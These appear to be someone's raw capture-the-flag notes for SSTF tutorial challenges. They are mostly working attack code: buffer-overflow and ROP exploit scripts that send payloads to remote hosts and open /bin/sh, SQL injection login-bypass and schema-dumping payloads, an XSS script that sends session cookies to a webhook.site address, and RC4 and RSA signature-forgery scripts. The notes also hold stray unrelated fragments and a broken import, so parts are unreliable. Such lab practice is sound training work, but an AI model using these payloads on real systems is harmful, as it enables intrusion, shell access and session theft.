```bow.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```



```shell-session
gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
```

```shell-session
 file bow32 | tr "," "\n"
```

```shell-session
gdb -q bow32
```

#### Change GDB Syntax
```shell-session
echo 'set disassembly-flavor intel' > ~/.gdbinit
```

```shell-session
(gdb) disassemble main
```

#### [[#length offset]]
^d3bf6f

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 140 > pattern.txt
```

```shell-session
run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9'")

```



```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x00005555555551cd 


```

 "dependencies": {
    "cookie-parser": "^1.4.6",
    "ejs": "^3.1.6",
    "express": "^4.17.3"


#### BOF 101

python2 -c 'print "A" *140+ "\xef\xbe\xad\xde" + "A" *8+  "\x29\x52\x55\x55\x55\x55" ' | nc bof101.sstf.site 1337

SCTF{n0w_U_R_B0F_3xpEr7}

#### BOF 102
python3 -c "import sus;sys.stdout.buffer.write(b'\xef\xbe\xad\xde')" | nc bof102.sstf.site 1337

objdump -d -j .plt bof102 | grep system


objdump -M intel -D  bof102

5555550a2730

0x5555555550b0
\xb0\x50\x55\x55\x55\x55

555555555240

\x40\x52\x55\x55\x55\x55

python2 -c 'print "A" *22 + "\x40\x52\x55\x55\x55\x55" ' | nc warmup1.ctf.maplebacon.org 1337

file.py:
```python
#telnetlib is a default library of python.
#You can use other library

from telnetlib import Telnet 

#connect
tn = Telnet("bof102.sstf.site", 1337)

#set name buffer as '/bin/sh'

tn.read_until(b"Name > ")
tn.write(b"/bin/sh" + b"\n")

payload = b"A" * (16+4)    			#fill payload and ebq
payload += b"\xe0\x83\x04\x08"		#set address of system()
payload += b"C" * 4					#set addr for system()
payload += b"\x34\xa0\x04\x08"		#set argument for system()

#trigger BOF

tn.read_until(b" > ")
tn.write(payload + b"\n")

#interact with /bin/bash

tn.interact()

```

0x08048605 

080483d0
\xd0\x3d\x48\x80

0x08048603

\x03\x86\x04\x80

run


0x00000000004017bb : pop rdi ; ret

00000000004013e1 T menu


```
python3 ./file.py
```

SCTF{5t4ck_c4n4ry_4nd_ASLR_4nd_PIE_4re_l3ft_a5_h0m3wOrk}
#### BOF 103


```
ROPgadget --binary bof103 | grep 'pop rdi'
```
output:
0x00000000004007b3 : pop rdi ; ret


```
nm bof103 | grep useme

```
output:
00000000004006a6 T useme

```
 nm bof103 | grep key 
```

output:

0000000000601068 B key
```
objdump -d -j .plt bof103 | grep 'system@plt'

```
output:

0000000000400550 <system@plt>:

script:
```python

from telnetlib import Telnet 
from struct import pack

system = 0x400550
useme = 0x4006a6
key = 0x601068
pop_rdi = 0x4007b3
pop_rsi = 0x400747

p64 = lambda x: pack("<Q", x)
payload = b"A" * (16 +8)
payload += p64(pop_rdi)
payload += b"/bin/sh\x00"
payload += p64(pop_rsi)
payload += p64(1)
payload += p64(useme)
payload += p64(pop_rdi)
payload += p64(key)
payload += p64(system)

tn = Telnet("bof103.sstf.site", 1337)
tn.read_until(b"Name >")
tn.write(payload + b"\n")
tn.interact()

```


SCTF{S0_w3_c4ll_it_ROP_cha1n}



#### sqli101

username: admin' ##
password: admin

SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}

#### Sqli102

book%' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL ##

Daily%' UNION SELECT 'A','B','C','D','E','F','G','H' ##


Signet%' UNION SELECT '',SCHEMA_NAME, '', '', '', '', '', '' FROM INFORMATION_SCHEMA.SCHEMATA ##

sqli102

Signet%' UNION SELECT '',TABLE_NAME, '', '', '', '', '', '' FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='sqli102' ##

Signet%' UNION SELECT '',COLUMN_NAME, '', '', '', '', '', '' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='findme' ##

SCTF{b451c_SQLi_5k1lls}


#### XSS 101
```

<script>img=new Image(); img.src='https://webhook.site/52175797-093d-45cf-94f8-1f67bfae694e?cookie='+document.cookie;</script>
```

`PHPSESSID=2f5edb1cfa2eeae87bb65625264fbe6b`

https://webhook.site/#!/52175797-093d-45cf-94f8-1f67bfae694e/566ae6ba-f417-401a-936b-0806c3f4f936/1

go to /admin.php

substituir a cookie e refresh

#### RC four

```python

from binascii import unhexlify

ct1, ct2 = open("output.txt").read().strip().split("\n")
msg = b"RC4 is a Stream Cipher, which is very simple and fast."

ct1 = unhexlify(ct1)
ct2 = unhexlify(ct2)

l = min(len(ct1), len(ct2))
r = ""
for (c1, m, c2) in zip(ct1[:100], msg[:100], ct2[:100]): 
	r += chr((c1 ^ m)^c2)

print(r)

```


SCTF{B10ck_c1pH3r_4nd_5tr3am_ciPheR_R_5ymm3tr1c}

#### RSA_101
```

nc rsa101.sstf.site 1104
[RSA parameters]
n = 0xde21ed04531d416637aff7db0379598f1f0e8e9f7d85814c61a0738852384a8afaf8d9a2e52f1c37f0a7f3a6cf08f144b2562a9cc0423ea3f4b6b27d6f74eaf585f28013e6b7dae2cc8b3dbb3241c2963f459e0e7b7bae0b0e1b3e61598eeef9e56ef53d0f85b4b4dd4278c9c1b17f81f65bad1498c12ed3f6adfd3c4fa12a61
e = 0x10001

Welcome to command signer/executor.
Menu : 1. Verify and run the signed command
       2. Generate a signed command
       3. Base64 encoder
       4. Exit
 > 3
String to encode: Zw==
Base64 encoded string: Wnc9PQ==

Welcome to command signer/executor.
Menu : 1. Verify and run the signed command
       2. Generate a signed command
       3. Base64 encoder
       4. Exit
 > 3
String to encode: Zw==
Base64 encoded string: Wnc9PQ==

Welcome to command signer/executor.
Menu : 1. Verify and run the signed command
       2. Generate a signed command
       3. Base64 encoder
       4. Exit
 > 2
Base64 encoded command to sign: Zw==
Signed command: CukrwE5AzbC5HX8UpVCyDgVtKinViz9lMHe62J+GBDR2CbhHCWJhs2Afha199sLhiwnQT1VqmGcY4ctYc1E+4Uo0AMzz6x33Om7wK0IiWAHUwfE/sn4BaPPmG02LqeQj46215kv03P1IGhEzkbVPYn4VGPfoaooXGZfApjs9ocQ=

Welcome to command signer/executor.
Menu : 1. Verify and run the signed command
       2. Generate a signed command
       3. Base64 encoder
       4. Exit
 > 2
Base64 encoded command to sign: 9wEgoA/3AQ==
Signed command: BZ0yZLVvO4h96ZQigksFKHAyx9XU0Pwp25KrvlsJMHDZrEXpcoKdv8tEq4UqkZnD0uePWxMl2p5MESD3FGdF2ACK8TrDXK8i+lZqKnX6FHEANMC0MS1xyk9NhfrrEhVCeAbYR3fHje2sxhfdRZRPl/G3T/EEl8uDY/S+G99rrFc=

Welcome to command signer/executor.
Menu : 1. Verify and run the signed command
       2. Generate a signed command
       3. Base64 encoder
       4. Exit
 > 1
Signed command: I+dREbNAzruiFQaY9JOESqfjvqhLX5jLLsARuqqoGFr5o5ySxpOtYlWPFcd+V6EeRkswy2kytldDYOfXDLeT+0HGZmdR0sbbBNYVP7BecJkrRyJ4Z/bGmHSUmJq0zcUSgxt+WKhZ2Aa/i7aIBiN5bRdRpBNR5AylWWf9sOU1obE=
SCTF{Mult1pLic4tiv3_pr0perty_of_RSA}
Welcome to command signer/executor.
Menu : 1. Verify and run the signed command
       2. Generate a signed command
       3. Base64 encoder
       4. Exit
 > 

```



```python

from Crypto.Util.number import long_to_bytes
from base64 import b64encode

n = 0xa76fd14686984a53df4c753ea034c8b0242637de8ec7dc333e2b546a951b54093a8d6134f9569aca0a87101bdaf8bda2ed73e508be3785258bc15573bee7f9d53c6eab959095fa19546a0362e50c95fa1bdca967ecb97258477720bcf6b6ed3d528afd04de4c6c1b6e43ce20139514e41af4531febf8a77965902579afab049d


print (b64encode(long_to_bytes(103)))


print(b64encode(long_to_bytes(69525558883514113)))
```


```python

from base64 import b64decode
from Crypto.Util.number import bytes_to_long


n = 0xde21ed04531d416637aff7db0379598f1f0e8e9f7d85814c61a0738852384a8afaf8d9a2e52f1c37f0a7f3a6cf08f144b2562a9cc0423ea3f4b6b27d6f74eaf585f28013e6b7dae2cc8b3dbb3241c2963f459e0e7b7bae0b0e1b3e61598eeef9e56ef53d0f85b4b4dd4278c9c1b17f81f65bad1498c12ed3f6adfd3c4fa12a61


#print (b64encode(long_to_bytes(103)))


#print(b64encode(long_to_bytes(69525558883514113)))

print(bytes_to_long(b64decode("CukrwE5AzbC5HX8UpVCyDgVtKinViz9lMHe62J+GBDR2CbhHCWJhs2Afha199sLhiwnQT1VqmGcY4ctYc1E+4Uo0AMzz6x33Om7wK0IiWAHUwfE/sn4BaPPmG02LqeQj46215kv03P1IGhEzkbVPYn4VGPfoaooXGZfApjs9ocQ=")))


print(bytes_to_long(b64decode("BZ0yZLVvO4h96ZQigksFKHAyx9XU0Pwp25KrvlsJMHDZrEXpcoKdv8tEq4UqkZnD0uePWxMl2p5MESD3FGdF2ACK8TrDXK8i+lZqKnX6FHEANMC0MS1xyk9NhfrrEhVCeAbYR3fHje2sxhfdRZRPl/G3T/EEl8uDY/S+G99rrFc=")))


```

```python

from base64 import b64encode
from Crypto.Util.number import long_to_bytes


n = 0xde21ed04531d416637aff7db0379598f1f0e8e9f7d85814c61a0738852384a8afaf8d9a2e52f1c37f0a7f3a6cf08f144b2562a9cc0423ea3f4b6b27d6f74eaf585f28013e6b7dae2cc8b3dbb3241c2963f459e0e7b7bae0b0e1b3e61598eeef9e56ef53d0f85b4b4dd4278c9c1b17f81f65bad1498c12ed3f6adfd3c4fa12a61


s1 = 7661841059880358780213154758975828309694289667024289608575366497968668160887529992284028335900597148752319503417768220673790767927650338468104097628957493653176670918343414753092545707962461280871984734244300368241422701344952027306316165230032599646097494150138708538309691058057398406984153268533443011012

s2 = 3942320112976758151542230196777556557314573412730616190232568725251645029763577715940838559961561228136422746979619573099602956379206008727979183546182523054226132081102287738449515203539060974894710388279145857271141998540003605152966276816293334567940913778614832026398230401691476558311950131464512449623


print(b64encode(long_to_bytes((s1*s2)%n)))

```